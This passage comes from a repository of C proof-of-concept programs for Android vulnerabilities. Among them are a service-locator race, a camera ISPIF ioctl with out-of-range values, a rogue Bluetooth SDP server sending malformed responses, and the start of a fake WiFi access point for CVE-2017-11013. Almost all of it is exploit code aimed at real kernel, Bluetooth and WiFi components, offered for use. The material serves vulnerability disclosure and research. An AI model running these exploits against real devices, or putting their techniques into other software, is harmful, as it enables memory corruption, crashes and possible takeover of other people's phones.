				qmi_servreg_loc_get_domain_list_resp_msg_v01,
				total_domains),
	},
	{
		.data_type      = QMI_OPT_FLAG,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x11,
		.offset         = offsetof(struct
				qmi_servreg_loc_get_domain_list_resp_msg_v01,
				db_rev_count_valid),
	},
	{
		.data_type      = QMI_UNSIGNED_2_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint16_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x11,
		.offset         = offsetof(struct
				qmi_servreg_loc_get_domain_list_resp_msg_v01,
				db_rev_count),
	},
	{
		.data_type      = QMI_OPT_FLAG,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x12,
		.offset         = offsetof(struct
				qmi_servreg_loc_get_domain_list_resp_msg_v01,
				domain_list_valid),
	},
	{
		.data_type      = QMI_DATA_LEN,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x12,
		.offset         = offsetof(struct
				qmi_servreg_loc_get_domain_list_resp_msg_v01,
				domain_list_len),
	},
	{
		.data_type      = QMI_STRUCT,
		.elem_len       = QMI_SERVREG_LOC_LIST_LENGTH_V01,
		.elem_size      = sizeof(struct servreg_loc_entry_v01),
		.is_array       = VAR_LEN_ARRAY,
		.tlv_type       = 0x12,
		.offset         = offsetof(struct
				qmi_servreg_loc_get_domain_list_resp_msg_v01,
				domain_list),
		.ei_array      = servreg_loc_entry_v01_ei,
	},
	QMI_EOTI_DATA_TYPE
};

struct elem_info qmi_servreg_loc_register_service_list_req_msg_v01_ei[] = {
	{
		.data_type      = QMI_STRING,
		.elem_len       = QMI_SERVREG_LOC_NAME_LENGTH_V01 + 1,
		.elem_size      = sizeof(char),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x01,
		.offset         = offsetof(struct
			qmi_servreg_loc_register_service_list_req_msg_v01,
			domain_name),
	},
	{
		.data_type      = QMI_DATA_LEN,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x02,
		.offset         = offsetof(struct
			qmi_servreg_loc_register_service_list_req_msg_v01,
			service_list_len),
	},
	{
		.data_type      = QMI_STRUCT,
		.elem_len       = QMI_SERVREG_LOC_LIST_LENGTH_V01,
		.elem_size      = sizeof(struct servreg_loc_entry_v01),
		.is_array       = VAR_LEN_ARRAY,
		.tlv_type       = 0x02,
		.offset         = offsetof(struct
			qmi_servreg_loc_register_service_list_req_msg_v01,
			service_list),
		.ei_array      = servreg_loc_entry_v01_ei,
	},
	QMI_EOTI_DATA_TYPE
};

struct elem_info qmi_servreg_loc_register_service_list_resp_msg_v01_ei[] = {
	{
		.data_type      = QMI_STRUCT,
		.elem_len       = 1,
		.elem_size      = sizeof(struct qmi_response_type_v01),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x02,
		.offset         = offsetof(struct
			qmi_servreg_loc_register_service_list_resp_msg_v01,
			resp),
		.ei_array      = get_qmi_response_type_v01_ei(),
	},
	QMI_EOTI_DATA_TYPE
};

struct elem_info qmi_servreg_loc_database_updated_ind_msg_v01_ei[] = {
	QMI_EOTI_DATA_TYPE
};

#endif

```

`CVE-2017-8259/service_locator.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>          /* See NOTES */
#include <sys/socket.h>
#include <fcntl.h>
#include <stdbool.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>
#include "qmi_encdec.h"
#include "service-locator-private.h"

struct msm_ipc_port_addr {
	uint32_t node_id;
	uint32_t port_id;
};

struct msm_ipc_port_name {
	uint32_t service;
	uint32_t instance;
};

struct msm_ipc_addr {
	unsigned char  addrtype;
	union {
		struct msm_ipc_port_addr port_addr;
		struct msm_ipc_port_name port_name;
	} addr;
};


/*
 * Socket API
 */

#define AF_MSM_IPC 27

#define PF_MSM_IPCAF_MSM_IPC

#define MSM_IPC_ADDR_NAME 1
#define MSM_IPC_ADDR_ID 2

struct sockaddr_msm_ipc {
	unsigned short family;
	struct msm_ipc_addr address;
	unsigned char reserved;
};

#define QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_V01 0x0021
#define QMI_RESPONSE_CONTROL_FLAG 0x02
volatile int wait = 1;

static const char *ThirtyOneAs =
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

static void recv_msgs(int fd)
{
	//ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags);
	struct msghdr msg = { 0 };
	struct iovec io = { 0 };
	struct sockaddr_msm_ipc addr = { 0 };
	struct msm_ipc_addr address = { 0 };
	uint8_t *ptr;
	struct qmi_header *hdr;
	struct qmi_servreg_loc_get_domain_list_resp_msg_v01 resp = { 0 };
	int count = 1;
	struct msg_desc resp_desc;

	printf("sizeof hdr %zu\n", sizeof(*hdr));
	//memset(&address, 0, sizeof(address));

	io.iov_base = malloc(4096);
	memset(io.iov_base, 0, 4096);
	io.iov_len = QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_MSG_V01_MAX_MSG_LEN + sizeof(*hdr);


	msg.msg_iovlen = 1;
	msg.msg_iov = &io;
	msg.msg_name = &addr;
	msg.msg_namelen = sizeof(addr);

	
	recvmsg(fd, &msg, MSG_CMSG_CLOEXEC);
	printf("node_id %u and port_id %u\n",
	       addr.address.addr.port_addr.node_id,
	       addr.address.addr.port_addr.port_id);
	hdr = io.iov_base;

	hdr->cntl_flag = QMI_RESPONSE_CONTROL_FLAG;
	//hdr->txn_id++;
	hdr->msg_id = QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_V01;
	hdr->msg_len = QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_MSG_V01_MAX_MSG_LEN;
		//io.iov_len = sizeof(hdr);

	ptr = io.iov_base + sizeof(*hdr);
	memset(ptr, 0, 4096 - sizeof(*hdr));
	resp_desc.msg_id = QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_V01;
	resp_desc.max_msg_len =
		QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_MSG_V01_MAX_MSG_LEN;
	resp_desc.ei_array = qmi_servreg_loc_get_domain_list_resp_msg_v01_ei;


	//resp = io.iov_base + sizeof(*hdr);
	resp.total_domains_valid = 1;
	resp.total_domains = 1;
	resp.db_rev_count_valid = 1;
	resp.db_rev_count = 4;
	resp.total_domains = 4;
	resp.domain_list_valid = 1;
	resp.domain_list_len = QMI_SERVREG_LOC_LIST_LENGTH_V01;
	int i;
	for (i = 0; i < resp.domain_list_len; i++) {
		strcpy(resp.domain_list[i].name, ThirtyOneAs);
		resp.domain_list[i].instance_id = 0x41414141;
		resp.domain_list[i].service_data_valid = 1;
		resp.domain_list[i].service_data = 0x41414141;
	}
	printf("max msg len is %zu and our out len is %zu\n",
	       QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_MSG_V01_MAX_MSG_LEN,
	       4096 - sizeof(*hdr));
	int ret = qmi_kernel_encode(&resp_desc, ptr, QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_MSG_V01_MAX_MSG_LEN, &resp);
	if (ret < 0) {
		printf("ret < 0\n");
	}
	printf("\n STARTING DECODE\n");
	qmi_kernel_decode(&resp_desc, &resp, ptr, QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_MSG_V01_MAX_MSG_LEN);


	//address.addrtype = MSM_IPC_ADDR_ID;
	sendmsg(fd, &msg, MSG_CMSG_CLOEXEC);
		//printf("msg %s\n", strerror(errno));
		//print_msg(io.iov_base);
	printf("sleeping for 16\n");
	sleep(15);

}

void *do_sys_read(void *_fd)
{

	char test[1024] = { 0 };
	int fd = *(int*)_fd;
	int srv_lktr;
	srv_lktr = open("/sys/class/service_locator/service_locator_status", O_RDWR);
	write(srv_lktr, "1", 1);
	printf("wrote srv_lktr with %s\n", strerror(errno));
	read(fd, test, sizeof(test));
	printf("Read complete with %s\n", strerror(errno));
	printf("%s\n",test);
	wait = 0;
	sleep(15);
}


#define SERVREG_LOC_SERVICE_ID_V01 0x40
#define SERVREG_LOC_SERVICE_VERS_V01 0x01
#define SERVREG_LOC_SERVICE_INSTANCE_ID                 1
#define BUILD_INSTANCE_ID(vers, ins) (((vers) & 0xFF) | (((ins) & 0xFF) << 8))
static void setup_ipc_server(void)
{
	int fd;
	int test_srvc;
	pthread_t race_car;
	struct sockaddr_msm_ipc addr = { 0 };
	fd = socket(AF_MSM_IPC, SOCK_DGRAM, 0);

	if (fd < 0) {
		printf("Couldn't open socket %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}

	addr.family = AF_MSM_IPC;
	addr.address.addrtype = MSM_IPC_ADDR_NAME;
	addr.address.addr.port_name.service = SERVREG_LOC_SERVICE_ID_V01;
	addr.address.addr.port_name.instance =
		BUILD_INSTANCE_ID(SERVREG_LOC_SERVICE_VERS_V01, SERVREG_LOC_SERVICE_INSTANCE_ID);

	bind(fd, (struct sockaddr *) &addr, sizeof(addr));
	printf("bind with strerror %s\n", strerror(errno));
	printf("opening test_service\n");
	test_srvc = open("/sys/kernel/debug/test_servloc", O_RDWR);
	if (!test_srvc) {
		close(fd);
		printf("failed to open test_srvloc with %s\n", strerror(errno));
		exit(1);
	}
	printf("service opened\n");
	printf("reading\n");
	pthread_create(&race_car, NULL, do_sys_read, &test_srvc);
	recv_msgs(fd);
}


int main(void)
{
	setup_ipc_server();
}

```

`CVE-2017-8260.c`:

```c
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <strings.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>


/* Poc by Scott Bauer
 * Bug discoverd by Derrek!
 */

#define BASE_VIDIOC_PRIVATE     192             /* 192-255 are private */

#define CSID_VERSION_V20                      0x02000011
#define CSID_VERSION_V22                      0x02001000
#define CSID_VERSION_V30                      0x30000000
#define CSID_VERSION_V3                      0x30000000

enum msm_ispif_vfe_intf {
	VFE0,
	VFE1,
	VFE_MAX
};
#define VFE0_MASK    (1 << VFE0)
#define VFE1_MASK    (1 << VFE1)

enum msm_ispif_intftype {
	PIX0,
	RDI0,
	PIX1,
	RDI1,
	RDI2,
	INTF_MAX
};
#define MAX_PARAM_ENTRIES (INTF_MAX * 2)
#define MAX_CID_CH	8

#define PIX0_MASK (1 << PIX0)
#define PIX1_MASK (1 << PIX1)
#define RDI0_MASK (1 << RDI0)
#define RDI1_MASK (1 << RDI1)
#define RDI2_MASK (1 << RDI2)


enum msm_ispif_vc {
	VC0,
	VC1,
	VC2,
	VC3,
	VC_MAX
};

enum msm_ispif_cid {
	CID0,
	CID1,
	CID2,
	CID3,
	CID4,
	CID5,
	CID6,
	CID7,
	CID8,
	CID9,
	CID10,
	CID11,
	CID12,
	CID13,
	CID14,
	CID15,
	CID_MAX
};

enum msm_ispif_csid {
	CSID0,
	CSID1,
	CSID2,
	CSID3,
	CSID_MAX
};

struct msm_ispif_params_entry {
	enum msm_ispif_vfe_intf vfe_intf;
	enum msm_ispif_intftype intftype;
	int num_cids;
	enum msm_ispif_cid cids[3];
	enum msm_ispif_csid csid;
	int crop_enable;
	uint16_t crop_start_pixel;
	uint16_t crop_end_pixel;
};

struct msm_ispif_param_data {
	uint32_t num;
	struct msm_ispif_params_entry entries[MAX_PARAM_ENTRIES];
};

struct msm_isp_info {
	uint32_t max_resolution;
	uint32_t id;
	uint32_t ver;
};

struct msm_ispif_vfe_info {
	int num_vfe;
	struct msm_isp_info info[VFE_MAX];
};

enum ispif_cfg_type_t {
	ISPIF_CLK_ENABLE,
	ISPIF_CLK_DISABLE,
	ISPIF_INIT,
	ISPIF_CFG,
	ISPIF_START_FRAME_BOUNDARY,
	ISPIF_RESTART_FRAME_BOUNDARY,
	ISPIF_STOP_FRAME_BOUNDARY,
	ISPIF_STOP_IMMEDIATELY,
	ISPIF_RELEASE,
	ISPIF_ENABLE_REG_DUMP,
	ISPIF_SET_VFE_INFO,
};

struct ispif_cfg_data {
	enum ispif_cfg_type_t cfg_type;
	union {
		int reg_dump;                        /* ISPIF_ENABLE_REG_DUMP */
		uint32_t csid_version;               /* ISPIF_INIT */
		struct msm_ispif_vfe_info vfe_info;  /* ISPIF_SET_VFE_INFO */
		struct msm_ispif_param_data params;  /* CFG, START, STOP */
	};
};

#define VIDIOC_MSM_ISPIF_CFG \
	_IOWR('V', BASE_VIDIOC_PRIVATE, struct ispif_cfg_data)



int main(void)
{

	int i, fd;
	char subdev[36];

	struct ispif_cfg_data pcdata = { 0 };
	struct ispif_cfg_data pcdata1 = { 0 };
	pcdata.cfg_type = ISPIF_CFG;
	pcdata.params.num = MAX_PARAM_ENTRIES - 1;

	pcdata1.cfg_type = ISPIF_INIT;
	pcdata1.csid_version = CSID_VERSION_V22;

	for (i = 0; i < pcdata.params.num; i++)
		pcdata.params.entries[i].vfe_intf = 0xFFFFF00;

	fd = open("/dev/v4l-subdev17", O_RDWR);
	if (fd > 0) {
		printf("ioctl on %s\n", subdev);
		ioctl(fd, VIDIOC_MSM_ISPIF_CFG, &pcdata1);
		ioctl(fd, VIDIOC_MSM_ISPIF_CFG, &pcdata);
		close(fd);
	} else
		printf("failed to open /dev/v4l-subdev17 with errno %s\n", subdev, strerror(errno));
}

```

`CVE-2018-9355.c`:

```c
/*
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/** CVE-2018-9355
 *  https://source.android.com/security/bulletin/2018-06-01
 */

#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <pthread.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/sdp.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>


#define EIR_FLAGS                   0x01  /* flags */
#define EIR_NAME_COMPLETE           0x09  /* complete local name */
#define EIR_LIM_DISC                0x01 /* LE Limited Discoverable Mode */
#define EIR_GEN_DISC                0x02 /* LE General Discoverable Mode */

#define DATA_ELE_SEQ_DESC_TYPE 6
#define UINT_DESC_TYPE 1


#define SIZE_SIXTEEN_BYTES 4
#define SIZE_EIGHT_BYTES 3
#define SIZE_FOUR_BYTES 2
#define SIZE_TWO_BYTES 1
#define SIZE_ONE_BYTE 0
#define SIZE_IN_NEXT_WORD 6
#define TWO_COMP_INT_DESC_TYPE 2
#define UUID_DESC_TYPE 3
#define ATTR_ID_SERVICE_ID 0x0003

static int count = 0;
static int do_continuation;

static int init_server(uint16_t mtu)
{
	struct l2cap_options opts;
	struct sockaddr_l2 l2addr;
	socklen_t optlen;
	int l2cap_sock;

	/* Create L2CAP socket */
	l2cap_sock = socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
	if (l2cap_sock < 0) {
		printf("opening L2CAP socket: %s", strerror(errno));
		return -1;
	}

	memset(&l2addr, 0, sizeof(l2addr));
	l2addr.l2_family = AF_BLUETOOTH;
	bacpy(&l2addr.l2_bdaddr, BDADDR_ANY);
	l2addr.l2_psm = htobs(SDP_PSM);

	if (bind(l2cap_sock, (struct sockaddr *) &l2addr, sizeof(l2addr)) < 0) {
		printf("binding L2CAP socket: %s", strerror(errno));
		return -1;
	}

	int opt = L2CAP_LM_MASTER;
	if (setsockopt(l2cap_sock, SOL_L2CAP, L2CAP_LM, &opt, sizeof(opt)) < 0) {
		printf("setsockopt: %s", strerror(errno));
		return -1;
	}

	memset(&opts, 0, sizeof(opts));
	optlen = sizeof(opts);

	if (getsockopt(l2cap_sock, SOL_L2CAP, L2CAP_OPTIONS, &opts, &optlen) < 0) {
		printf("getsockopt: %s", strerror(errno));
		return -1;
	}
	opts.omtu = mtu;
	opts.imtu = mtu;

	if (setsockopt(l2cap_sock, SOL_L2CAP, L2CAP_OPTIONS, &opts, sizeof(opts)) < 0) {
		printf("setsockopt: %s", strerror(errno));
		return -1;
	}

	if (listen(l2cap_sock, 5) < 0) {
	  printf("listen: %s", strerror(errno));
	  return -1;
	}

	return l2cap_sock;
}

static int process_service_search_req(uint8_t *pkt)
{
	uint8_t *start = pkt;
	uint8_t *lenloc = pkt;


	/* Total Handles */
	bt_put_be16(400, pkt); pkt += 2;
	bt_put_be16(400, pkt); pkt += 2;

	/* and that's it! */
	/* TODO: Can we do some heap grooming to make sure we don't get a continuation? */

	//bt_put_be16((pkt - start) - 2, lenloc);
	return pkt - start;
}

static uint8_t *place_uid(uint8_t *pkt, int o)
{
	int i;
	for (i = 0; i < 16; i++)
		*pkt++ = 0x16 + (i + o);
	return pkt;

}

static size_t flood_u128s(uint8_t *pkt)
{
	int i;
	uint8_t *start = pkt;
	uint8_t *lenloc = pkt;
	size_t retsize = 0;

	bt_put_be16(9, pkt);pkt += 2;

	if (do_continuation == 1) {
		*pkt = DATA_ELE_SEQ_DESC_TYPE << 3;
		*pkt |= SIZE_IN_NEXT_WORD;
		pkt++;
		start = pkt;
		pkt += 2;
	}

	//*pkt = (DATA_ELE_SEQ_DESC_TYPE << 3) | SIZE_TWO_BYTES;
	//pkt++;

	for (i = 0; i < 31; i++) {
		*pkt = (DATA_ELE_SEQ_DESC_TYPE << 3) | SIZE_TWO_BYTES;
		pkt++;

		*pkt = (UINT_DESC_TYPE << 3) | SIZE_TWO_BYTES;;
		pkt++;
		/* Attr ID */
		bt_put_be16(ATTR_ID_SERVICE_ID, pkt); pkt += 2;

		*pkt = (UUID_DESC_TYPE << 3) | SIZE_SIXTEEN_BYTES;
		pkt++;
		pkt = place_uid(pkt, i);
	}
	/* Set the continuation */
	if (do_continuation) {
		bt_put_be16(654, lenloc);
		bt_put_be16(651 * 2, start);
		*pkt = 1;
		retsize = 658;
	}
	else {
		bt_put_be16(651, lenloc);
		//bt_put_be16(648, start);
		*pkt = 0;
		retsize = 654;
	}
	//	bt_put_be16((pkt - lenloc) + 10, lenloc);
	//	bt_put_be16((pkt - start) + 10, start);
	printf("%s: size is pkt - lenloc %zu and pkt is 0x%02x\n", __func__, pkt - lenloc, *pkt);
	pkt++;

	return retsize;

}

static size_t do_fake_svcsar(uint8_t *pkt)
{

	int i;
	uint8_t *start = pkt;
	uint8_t *lenloc = pkt;
	/* Id and length -- ignored in the code */
	//bt_put_be16(0, pkt);pkt += 2;
	//bt_put_be16(0xABCD, pkt);pkt += 2;
	/* list byte count */
	bt_put_be16(9, pkt);pkt += 2;

	*pkt = DATA_ELE_SEQ_DESC_TYPE << 3;
	*pkt |= SIZE_EIGHT_BYTES;
	pkt++;

	*pkt = (DATA_ELE_SEQ_DESC_TYPE << 3) | SIZE_TWO_BYTES;
	pkt++;

	*pkt = (UINT_DESC_TYPE << 3) | SIZE_TWO_BYTES;;
	pkt++;
	/* Attr ID */
	bt_put_be16(0x0100, pkt); pkt += 2;

	*pkt = (DATA_ELE_SEQ_DESC_TYPE << 3) | SIZE_TWO_BYTES;
	pkt++;

	*pkt = (DATA_ELE_SEQ_DESC_TYPE << 3) | SIZE_TWO_BYTES;
	pkt++;

	/* Set the continuation */
	if (do_continuation)
		*pkt = 1;
	else
		*pkt = 1;
	pkt++;

	/* Place the size... */
	//bt_put_be16((pkt - start) - 2, lenloc);

	printf("%zu\n", pkt-start);
	return (size_t) (pkt - start);
}

static void process_request(uint8_t *buf, int fd)
{
	sdp_pdu_hdr_t *reqhdr = (sdp_pdu_hdr_t *) buf;
	sdp_pdu_hdr_t *rsphdr;
	uint8_t *rsp = malloc(65535);
	int status = SDP_INVALID_SYNTAX;
	int send_size = 0;

	memset(rsp, 0, 65535);
	rsphdr = (sdp_pdu_hdr_t *)rsp;
	rsphdr->tid = reqhdr->tid;

	switch (reqhdr->pdu_id) {
	case SDP_SVC_SEARCH_REQ:
		printf("Got a svc srch req\n");
		send_size = process_service_search_req(rsp + sizeof(sdp_pdu_hdr_t));
		rsphdr->pdu_id = SDP_SVC_SEARCH_RSP;
		rsphdr->plen = htons(send_size);
		break;
	case SDP_SVC_ATTR_REQ:
		printf("Got a svc attr req\n");
		//status = service_attr_req(req, &rsp);
		rsphdr->pdu_id = SDP_SVC_ATTR_RSP;
		break;
	case SDP_SVC_SEARCH_ATTR_REQ:
		printf("Got a svc srch attr req\n");
		//status = service_search_attr_req(req, &rsp);
		rsphdr->pdu_id = SDP_SVC_SEARCH_ATTR_RSP;
		send_size = flood_u128s(rsp + sizeof(sdp_pdu_hdr_t));
		//do_fake_svcsar(rsp + sizeof(sdp_pdu_hdr_t)) + 3;
		rsphdr->plen = htons(send_size);
		break;
	default:
		printf("Unknown PDU ID : 0x%x received", reqhdr->pdu_id);
		status = SDP_INVALID_SYNTAX;
		break;
	}
	printf("%s: sending %zu\n", __func__, send_size + sizeof(sdp_pdu_hdr_t));
	send(fd, rsp, send_size + sizeof(sdp_pdu_hdr_t), 0);
	free(rsp);
}


static void *l2cap_data_thread(void *input)
{
	int fd = *(int *)input;
	sdp_pdu_hdr_t hdr;
	uint8_t *buf;
	int len, size;

	while (true) {
		len = recv(fd, &hdr, sizeof(sdp_pdu_hdr_t), MSG_PEEK);
		if (len < 0 || (unsigned int) len < sizeof(sdp_pdu_hdr_t)) {
			continue;
		}

		size = sizeof(sdp_pdu_hdr_t) + ntohs(hdr.plen);
		buf = malloc(size);
		if (!buf)
			continue;

		printf("%s: trying to recv %d\n", __func__, size);
		len = recv(fd, buf, size, 0);
		if (len <= 0) {
			free(buf);
			continue;
		}

		if (!count) {
			process_request(buf, fd);
			count ++;
		}
		if (count >= 1) {
			do_continuation = 0;
			process_request(buf, fd);
			count++;
		}

		free(buf);
	}
}

/* derived from hciconfig.c */
static void *advertiser(void *unused)
{
	uint8_t status;
	int device_id, handle;
	struct hci_request req = { 0 };
	le_set_advertise_enable_cp acp = { 0 };
	le_set_advertising_parameters_cp avc = { 0 };
	le_set_advertising_data_cp data = { 0 };

	device_id = hci_get_route(NULL);

	if (device_id < 0) {
		printf("%s: Failed to get route: %s\n", __func__, strerror(errno));
		return NULL;
	}
	handle = hci_open_dev(hci_get_route(NULL));
	if (handle < 0) {
		printf("%s: Failed to open and aquire handle: %s\n", __func__, strerror(errno));
		return NULL;
	}

	avc.min_interval = avc.max_interval = htobs(150);
	avc.chan_map = 7;
	req.ogf = OGF_LE_CTL;
	req.ocf = OCF_LE_SET_ADVERTISING_PARAMETERS;
	req.cparam = &avc;
	req.clen = LE_SET_ADVERTISING_PARAMETERS_CP_SIZE;
	req.rparam = &status;
	req.rlen = 1;

	if (hci_send_req(handle, &req, 1000) < 0) {
		hci_close_dev(handle);
		printf("%s: Failed to send request %s\n", __func__, strerror(errno));
		return NULL;
	}
	memset(&req, 0, sizeof(req));
	req.ogf = OGF_LE_CTL;
	req.ocf = OCF_LE_SET_ADVERTISE_ENABLE;
	req.cparam = &acp;
	req.clen = LE_SET_ADVERTISE_ENABLE_CP_SIZE;
	req.rparam = &status;
	req.rlen = 1;

	data.data[0] = htobs(2);
	data.data[1] = htobs(EIR_FLAGS);
	data.data[2] = htobs(EIR_GEN_DISC | EIR_LIM_DISC);

	data.data[3] = htobs(6);
	data.data[4] = htobs(EIR_NAME_COMPLETE);
	data.data[5] = 'D';
	data.data[6] = 'L';
	data.data[7] = 'E';
	data.data[8] = 'A';
	data.data[9] = 'K';

	data.length = 10;

	memset(&req, 0, sizeof(req));
	req.ogf = OGF_LE_CTL;
	req.ocf = OCF_LE_SET_ADVERTISING_DATA;
	req.cparam = &data;
	req.clen = LE_SET_ADVERTISING_DATA_CP_SIZE;
	req.rparam = &status;
	req.rlen = 1;

	if (hci_send_req(handle, &req, 1000) < 0) {
		hci_close_dev(handle);
		printf("%s: Failed to send request %s\n", __func__, strerror(errno));
		return NULL;
	}
	printf("Device should be advertising under DLEAK\n");
}



int main(int argc, char **argv)
{
	pthread_t *io_channel;
	pthread_t adv;
	int       fds[16];
	const int io_chans = 16;
	struct sockaddr_l2 addr;
	socklen_t qlen = sizeof(addr);
	socklen_t len = sizeof(addr);
	int l2cap_sock;
	int i;


	pthread_create(&adv, NULL, advertiser, NULL);
	l2cap_sock = init_server(652);
	if (l2cap_sock < 0)
		return EXIT_FAILURE;

	io_channel = malloc(io_chans * sizeof(*io_channel));
	if (!io_channel)
		return EXIT_FAILURE;

	do_continuation = 1;
	for (i = 0; i < io_chans; i++) {
		printf("%s: Going to accept on io chan %d\n", __func__, i);
		fds[i] = accept(l2cap_sock, (struct sockaddr *) &addr, &len);
		if (fds[i] < 0) {
			i--;
			printf("%s: Accept failed with %s\n", __func__, strerror(errno));
			continue;
		}
		printf("%s: accepted\n", __func__);
		pthread_create(&io_channel[i], NULL, l2cap_data_thread, &fds[i]);
	}
}

```

`README.md`:

```md
# This repository houses a series of Proofs of Concept C programs that trigger vulnerabilities that I have found in Android.

If you found these useful and you want to say thanks I like swag. Tshirts/Beer steins/coffe cups etc. Email me for more info. 

For the most up-to-date list of my bugs see https://plzdonthack.me

For the bugs listed with _mtk.c I didn't bother even trying to compile them as I don't have a mediatek device to test on.



```

`wifi/CVE-2017-11013.c`:

```c
/*
 * jduck's fake AP for WiFi hax.
 *
 * by Joshua J. Drake (@jduck) on 2017-06-13
 * Modified by Sbauer for action roam.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

/* hi-res time */
#include <time.h>

/* internet networking / packet sending */
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <linux/if.h>
#include <linux/if_packet.h>

/* packet capturing */
#include <pcap/pcap.h>


/* global hardcoded parameters */
#define SNAPLEN 4096
#define BEACON_INTERVAL 500
#define DEFAULT_CHANNEL 1


/* some bits borrowed from tcpdump! thanks guys! */
#define T_MGMT 0x0  /* management */
#define T_CTRL 0x1  /* control */
#define T_DATA 0x2  /* data */
#define T_RESV 0x3  /* reserved */

#define ST_ASSOC_REQ 0
#define ST_ASSOC_RESP 1
#define ST_PROBE_REQ 4
#define ST_PROBE_RESP 5
#define ST_BEACON 8
#define ST_AUTH 11
#define ST_ACTION 13

#define CF_RETRY 8

#define IEID_SSID 0
#define IEID_RATES 1
#define IEID_DSPARAMS 3

#define IEEE80211_RADIOTAP_RATE 2

#define IEEE80211_BROADCAST_ADDR ((u_int8_t *)"\xff\xff\xff\xff\xff\xff")


const char *dot11_types[4] = { "mgmt", "ctrl", "data", "resv" };
const char *dot11_subtypes[4][16] = {
	/* mgmt */
	{ "assoc-req", "assoc-resp",
		"re-assoc-req", "re-assoc-resp",
		"probe-req", "probe-resp",
		"6?", "7?",
		"beacon", "atim",
		"dis-assoc", "auth",
		"de-auth", "action",
		"14?", "15?" },
	/* ctrl */
	{ "0?", "1?", "2?", "3?", "4?", "5?", "6?", "7?",
		"8?", "block-ack", "ps-poll", "rts", "cts", "ack", "cf-end", "cf-end-ack" },
	/* data */
	{ "0?", "1?", "2?", "3?", "4?", "5?", "6?", "7?", "8?", "9?", "10?", "11?", "12?", "13?", "14?", "15?" },
	/* reserved */
	{ "0?", "1?", "2?", "3?", "4?", "5?", "6?", "7?", "8?", "9?", "10?", "11?", "12?", "13?", "14?", "15?" }
};

int g_sock;
char g_iface[64];

u_int8_t g_bssid[ETH_ALEN];
u_int8_t g_ssid[32];
u_int8_t g_ssid_len;
u_int8_t g_channel = DEFAULT_CHANNEL;

u_int8_t g_pkt[4096];
size_t g_pkt_len = 0;
struct timespec last_retransmit;

/* global options */
int g_send_beacons = 0;
struct timespec last_beacon;

typedef enum {
	S_AWAITING_PROBE_REQ = 0,
	S_SENT_PROBE_RESP = 1,
	S_SENT_AUTH = 2,
	S_SENT_ASSOC_RESP = 3,
	S_ESTABLISHED = 4,
	S_EXPLOIT_SENT = 5
} state_t;

state_t g_state = S_AWAITING_PROBE_REQ;


struct ieee80211_radiotap_header {
	u_int8_t it_version;      /* set to 0 */
	u_int8_t it_pad;
	u_int16_t it_len;         /* entire length */
	u_int32_t it_present;     /* fields present */
} __attribute__((__packed__));
typedef struct ieee80211_radiotap_header radiotap_t;

struct ieee80211_frame_header {
	u_int version:2;
	u_int type:2;
	u_int subtype:4;
	u_int8_t ctrlflags;
	u_int16_t duration;
	u_int8_t dst_mac[ETH_ALEN];
	u_int8_t src_mac[ETH_ALEN];
	u_int8_t bssid[ETH_ALEN];
	u_int frag:4;
	u_int seq:12;
} __attribute__((__packed__));
typedef struct ieee80211_frame_header dot11_frame_t;

struct ieee80211_beacon {
	u_int64_t timestamp;
	u_int16_t interval;
	u_int16_t caps;
} __attribute__((__packed__));
typedef struct ieee80211_beacon beacon_t;

struct ieee80211_information_element {
	u_int8_t id;
	u_int8_t len;
	u_int8_t data[0];
} __attribute__((__packed__));
typedef struct ieee80211_information_element ie_t;

struct ieee80211_authentication {
	u_int16_t algorithm;
	u_int16_t seq;
	u_int16_t status;
} __attribute__((__packed__));
typedef struct ieee80211_authentication auth_t;

struct ieee80211_assoc_request {
	u_int16_t caps;
	u_int16_t interval;
} __attribute__((__packed__));
typedef struct ieee80211_assoc_request assoc_req_t;

